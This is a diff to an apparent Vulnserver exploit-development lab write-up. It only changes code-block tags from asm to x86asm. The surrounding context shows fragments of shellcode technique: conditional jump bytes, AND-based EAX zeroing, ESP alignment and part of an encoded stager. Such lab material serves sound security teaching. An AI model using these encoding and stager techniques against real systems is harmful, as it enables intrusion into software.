@@ -475,7 +475,7 @@ is simple:
 So, instead of injecting a simple `JNZ SHORT +0x8`, we will inject two
 conditional jumps:
 
-[source,asm]
+[source,x86asm]
 ----
 \x75\x08      ; JNZ SHORT +0x10: Will jump if ZF is 1
 \x74\x06      ; JZ SHORT +0x8: If the previous jump didn't happen (ZF is 0), jump!
@@ -662,7 +662,7 @@ would be `\xeb\x80\x90\x90`.
 First, we need to zero out `EAX`. This can be done using a couple of `AND`
 instructions:
 
-[source,asm]
+[source,x86asm]
 ----
 AND EAX,504A5050
 AND EAX,2A302A2A
@@ -759,7 +759,7 @@ With the needed bytes, we need to align the `ESP` pointer again. As we saw,
 it's a good idea to point it to the higher memory of the block in order
 to avoid overwriting our encoded payload. This leads to:
 
-[source,asm]
+[source,x86asm]
 ----
 push esp            ; Push the current value of ESP on the stack
 pop eax             ; Pop it to EAX register
@@ -905,7 +905,7 @@ only a slight modification on the `ESP` alignment (2 bytes instead of 64). More
 information of that stager on the link:../vulnserver-kstet/[KSTET writeup]:
 
 .shellcode.asm
-[source,asm]
+[source,x86asm]
 ----
 sub esp,0x2		        ; Align ESP 2 bytes above
 xor edi,edi             ; Zero out EDI
@@ -976,7 +976,7 @@ STAGER += b'\x21\x6e\x6d\x32\x2d\x31\x7b\x65\x7a\x50'
 
 We need to align our `ESP` pointer again:
 
-[source,asm]
+[source,x86asm]
 ----
 push esp            ; Push the current value of ESP on the stack
 pop eax             ; Pop it to EAX register
